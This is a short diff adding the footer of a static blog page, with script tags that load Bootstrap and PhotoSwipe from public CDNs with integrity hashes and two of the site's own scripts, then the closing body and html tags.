+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
